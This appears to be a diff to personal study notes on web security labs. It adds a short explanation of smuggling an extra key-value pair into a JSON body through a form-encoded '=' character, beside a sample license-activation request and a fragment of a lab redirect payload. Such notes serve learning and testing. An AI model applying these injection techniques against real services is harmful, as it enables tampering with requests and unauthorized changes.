@@ -496,6 +496,9 @@ document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=
 ```
 {"activatees":{"activatee":[{"activateeEmailId":"","activateeEnterpriseId":"300007714280","isDefault":true,"isEnabled":true,"addIfNotAvailable":true}]},"activationProductKeys":{"activationProductKeyId":[{"activationQuantity":1,"productKey":"f5dbdc8e-2837-4313-a6de-5f9bba954a77"}]},"activationAttributes":{"activationAttribute":[{"name":"MaintenanceExpiration","value":"2025-05-02","readOnly":false,"mandatory":true,"associatedAttribute":null},{"name":"FileName","value":"IntelLicense.lic","readOnly":false,"mandatory":true,"associatedAttribute":null}]}}=
 ```
+- Solution: craft the form payload so that an additional JSON pair is added that looks like `"newKey=":"newValue"`
+	- The URL param '=' becomes part of the JSON key name
+	- JSON typically doesn't care about extraneous values added
 
 
 # OAUTH
